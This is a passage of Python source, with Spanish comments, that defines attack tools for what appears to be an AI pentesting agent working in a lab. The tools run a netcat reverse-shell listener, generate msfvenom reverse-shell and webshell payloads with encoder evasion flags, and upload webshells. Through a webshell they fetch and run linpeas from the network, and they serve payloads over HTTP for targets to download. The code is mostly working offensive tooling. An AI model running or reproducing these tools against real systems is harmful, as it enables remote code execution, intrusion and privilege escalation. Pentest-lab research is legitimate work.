    # timeout + nc con -k para mantener puerto abierto tras cada conexion
    command = (
        f"rm -f {log}; "
        f"(timeout {int(timeout_seconds)} nc -lnvp {port} > {log} 2>&1 &) ; "
        f"sleep 1; echo 'Listener {port} activo por {timeout_seconds}s. "
        f"IP atacante: 10.10.0.5. Lee output con: cat {log}'"
    )
    result = _docker().exec_in_attacker(command, timeout=10)
    return result.stdout or result.stderr


@tool
def run_msfvenom(
    payload: str,
    lhost: str = "10.10.0.5",
    lport: int = 4444,
    format_type: str = "raw",
    extra_flags: str = "",
) -> str:
    """Genera payload con msfvenom (reverse shell, bind, webshell, etc).

    Ref: Metasploit Framework, primary payload generator en pentesting.
    Payloads comunes:
      - linux/x64/shell_reverse_tcp: reverse shell TCP (con -f elf para binario)
      - php/reverse_php: webshell PHP que hace reverse connect
      - cmd/unix/reverse_bash: one-liner bash
      - python/shell_reverse_tcp: reverse shell Python

    Args:
        payload: Tipo de payload msfvenom.
        lhost: IP del listener (atacante). Default 10.10.0.5.
        lport: Puerto del listener. Default 4444.
        format_type: raw, elf, exe, php, python, bash, perl, psh.
        extra_flags: Flags adicionales (ej: "-e x86/shikata_ga_nai -i 3").

    Returns:
        Payload generado (raw stdout). Guardalo con run_command y sirvelo.
    """
    q_payload = shlex.quote(payload)
    q_format = shlex.quote(format_type)
    command = (
        f"msfvenom -p {q_payload} LHOST={shlex.quote(lhost)} LPORT={int(lport)} "
        f"-f {q_format} {extra_flags} 2>&1"
    )
    result = _docker().exec_in_attacker(command, timeout=60)
    output = result.stdout or result.stderr
    if "Error" in output or "not found" in output.lower():
        return f"[ERROR] msfvenom fallo. Verifica payload. Output:\n{output}"
    return output


@tool
def run_file_upload(
    target_url: str,
    file_path_on_attacker: str,
    form_field: str = "file",
    session_id: str = "default",
    extra_data: str = "",
) -> str:
    """Sube un archivo al target via multipart/form-data POST con sesion activa.

    Usa la cookie jar generada previamente por run_http_session con el mismo
    session_id. Util para subir webshells via paneles de upload vulnerables.

    Args:
        target_url: URL del endpoint de upload.
        file_path_on_attacker: Path del archivo en el container atacante
            (ej: /tmp/shell.php). Puedes crear archivos con run_command previamente.
        form_field: Nombre del campo del form que acepta el archivo (default 'file').
        session_id: session_id compartido con run_http_session.
        extra_data: Campos adicionales del form separados por & (ej: "action=upload").

    Returns:
        Respuesta HTTP del servidor tras el upload.
    """
    jar = _safe_tmp_path("session", session_id, ".txt")
    q_url = shlex.quote(target_url)
    q_file = shlex.quote(file_path_on_attacker)
    q_field = shlex.quote(form_field)
    extra = ""
    if extra_data:
        for kv in extra_data.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                extra += f" -F {shlex.quote(k)}={shlex.quote(v)}"
    command = (
        f"curl -s -i -b {jar} -c {jar} "
        f"-F {q_field}=@{q_file}{extra} "
        f"{q_url} 2>&1 | head -100"
    )
    result = _docker().exec_in_attacker(command, timeout=45)
    return result.stdout or result.stderr


@tool
def decode_string(data: str, encoding: str = "base64") -> str:
    """Decodifica strings en encodings comunes descubiertos en pentesting.

    Util para base64 (comun en CTFs como Mr. Robot fsocity.dic), hex, url-encoded,
    rot13. Ejecuta en el container atacante, no localmente.

    Args:
        data: String a decodificar.
        encoding: base64, base32, hex, urlencode, rot13.

    Returns:
        String decodificado.
    """
    enc = encoding.lower().strip()
    q_data = shlex.quote(data)
    if enc == "base64":
        command = f"printf %s {q_data} | base64 -d 2>&1"
    elif enc == "base32":
        command = f"printf %s {q_data} | base32 -d 2>&1"
    elif enc == "hex":
        command = f"printf %s {q_data} | xxd -r -p 2>&1"
    elif enc == "urlencode":
        command = f"python3 -c 'import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))' {q_data}"
    elif enc == "rot13":
        command = f"printf %s {q_data} | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
    else:
        return f"[ERROR] Encoding no soportado: {encoding}. Usa: base64, base32, hex, urlencode, rot13."
    result = _docker().exec_in_attacker(command, timeout=10)
    return result.stdout or result.stderr


@tool
def run_linpeas(webshell_url: str, mode: str = "auto") -> str:
    """Descarga y ejecuta linpeas.sh via webshell para enumeracion de priv-esc.

    LinPEAS es la herramienta estandar de facto para enumeracion de vectores de
    escalacion en Linux (ref: github.com/carlospolop/PEASS-ng). Buscara:
    SUID/SGID, sudo rules, cron jobs, kernel exploits conocidos, credenciales
    en archivos, misconfigs, etc. Output estructurado con colores indicando
    severidad.

    Alternativa: run_priv_esc_enum que hace checks comunes sin descargar nada
    externo (mas discreto).

    Args:
        webshell_url: URL de la webshell activa.
        mode: 'auto' descarga + ejecuta. 'check' solo verifica si linpeas
            existe en el target (no lo ejecuta).

    Returns:
        Output de linpeas (truncado a 10000 chars por practicidad).
    """
    import urllib.parse
    linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"

    if mode == "check":
        target_cmd = "command -v linpeas.sh || echo 'linpeas no instalado'"
    else:
        # Descarga a /tmp, ejecuta, limpia. Timeout 120s para scan completo.
        target_cmd = (
            f"cd /tmp && "
            f"curl -s -o linpeas.sh {linpeas_url} 2>&1 && "
            f"chmod +x linpeas.sh && "
            f"timeout 120 ./linpeas.sh -q 2>&1 | tail -300 ; "
            f"rm -f linpeas.sh"
        )

    parts = urllib.parse.urlsplit(webshell_url)
    query_params = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    query_params["cmd"] = target_cmd
    rebuilt = urllib.parse.urlunsplit((
        parts.scheme, parts.netloc, parts.path,
        urllib.parse.urlencode(query_params), parts.fragment,
    ))
    cmd = f"curl -s --max-time 150 {shlex.quote(rebuilt)}"
    result = _docker().exec_in_attacker(cmd, timeout=180)
    out = result.stdout or result.stderr
    return out[:10000] if len(out) > 10000 else out


@tool
def write_exploit_file(path: str, content: str) -> str:
    """Crea un archivo en el container atacante con contenido arbitrario.

    Util para preparar payloads locales (shell.php, exploit.py, payload.elf)
    antes de subirlos con run_file_upload. Evita el workaround de hacer echo/tee
    con caracteres shell que pueden escaparse.

    Args:
        path: Ruta absoluta en el container atacante (ej: /tmp/shell.php).
        content: Contenido del archivo (raw, se escribe tal cual).

    Returns:
        Confirmacion con tamaño del archivo escrito.
    """
    if not path.startswith("/tmp/") and not path.startswith("/opt/"):
        return f"[ERROR] Por seguridad, solo se permite escribir en /tmp/ o /opt/. Path: {path}"
    # Usamos python para evitar problemas de escaping con heredocs y caracteres
    # especiales. El content va como argv (shlex.quote lo maneja).
    q_path = shlex.quote(path)
    q_content = shlex.quote(content)
    command = (
        f"python3 -c \"import sys; "
        f"open(sys.argv[1], 'w').write(sys.argv[2]); "
        f"print(f'Escritos {{len(sys.argv[2])}} chars en {{sys.argv[1]}}')\" "
        f"{q_path} {q_content}"
    )
    result = _docker().exec_in_attacker(command, timeout=10)
    return result.stdout or result.stderr


@tool
def serve_http(directory: str = "/tmp", port: int = 8000, duration_seconds: int = 120) -> str:
    """Sirve archivos HTTP en background para entregar payloads al target.

    Inicia un servidor HTTP simple en <directory> (default /tmp) que el target
    puede descargar via wget/curl. Util cuando quieres que el target jale
    linpeas, un binario compilado, o un payload desde el atacante.

    Args:
        directory: Directorio a servir.
        port: Puerto HTTP (default 8000).
        duration_seconds: Segundos que estara activo. Default 120.

    Returns:
        URL accesible desde el target: http://10.10.0.5:<port>/
    """
    port = int(port)
    if port < 1024 or port > 65535:
        return f"[ERROR] Puerto invalido: {port}"
    q_dir = shlex.quote(directory)
    log = f"/tmp/http_server_{port}.log"
    command = (
        f"rm -f {log}; "
        f"(cd {q_dir} && timeout {int(duration_seconds)} "
        f"python3 -m http.server {port} > {log} 2>&1 &) ; "
        f"sleep 1; "
        f"echo 'Servidor HTTP activo en http://10.10.0.5:{port}/ "
        f"sirviendo {directory} por {duration_seconds}s. "
        f"Desde el target: wget http://10.10.0.5:{port}/archivo.sh'"
    )
    result = _docker().exec_in_attacker(command, timeout=10)
    return result.stdout or result.stderr


@tool
def run_dirsearch(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,txt,bak,zip",
    flags: str = "",
) -> str:
    """Enumeracion de directorios con dirsearch (alternativa a gobuster).

    Dirsearch (github.com/maurosoria/dirsearch) tiene mejor deteccion de
    content (usa respuestas por defecto del server para filtrar falsos
    positivos) y soporta recursion integrada. Complementa a gobuster cuando
    gobuster no encuentra nada o da muchos 403.

    Args:
        url: URL base a enumerar.
        wordlist: Ruta al wordlist.
        extensions: Extensiones separadas por coma.
        flags: Flags adicionales de dirsearch.

    Returns:
        Lista de paths descubiertos con status code.
    """
    q_url = shlex.quote(url)
    q_wl = shlex.quote(wordlist)
    q_ext = shlex.quote(extensions)
    command = (
        f"dirsearch -u {q_url} -w {q_wl} -e {q_ext} "
        f"--no-color --full-url {flags} 2>&1 | tail -60"
    )
    result = _docker().exec_in_attacker(command, timeout=120)
    output = result.stdout or result.stderr
    if not output.strip():
        return f"[INFO] dirsearch sin resultados en {url}."
    return output


@tool
def run_whatweb(url: str, flags: str = "-a 1") -> str:
    """Fingerprinting de tecnologias web con WhatWeb.

    WhatWeb identifica CMS, frameworks, servers, JS libraries via firmas HTTP
    (headers, body patterns, paths). Mas completo que nmap -sV para apps web.

    Args:
        url: URL a fingerprintear.
        flags: Flags whatweb. -a 1 (rapido), -a 3 (agresivo), -a 4 (heavy).

    Returns:
        Tecnologias detectadas con versiones.
    """
    q_url = shlex.quote(url)
    command = f"whatweb {flags} --no-errors {q_url} 2>&1 | head -40"
    result = _docker().exec_in_attacker(command, timeout=45)
    output = result.stdout or result.stderr
    if not output.strip():
        return f"[INFO] whatweb sin respuesta para {url}."
    return output


ATTACKER_TOOLS = [
    # Reconnaissance
    run_nmap,
    run_nikto,
    run_whatweb,
    run_gobuster,
    run_gobuster_recursive,
    run_dirsearch,
    run_spider,
    run_wpscan,
    run_dns_enum,
    run_enum4linux,
    run_smbclient,
    run_ftp,
    run_searchsploit,
    # Initial Access / Credential Attack
    run_hydra_http_form,
    run_hydra,
    run_john,
    # Execution / Exploitation
    run_http_session,
    run_sqlmap,
    run_curl,
    run_command,
    run_web_shell,
    run_ssh_exec,
    run_file_upload,
    # Payload generation & delivery
    run_msfvenom,
    write_exploit_file,
    start_reverse_listener,
    serve_http,
    # Discovery / Privilege Escalation
    run_priv_esc_enum,
    run_linpeas,
    # Utility
    decode_string,
]
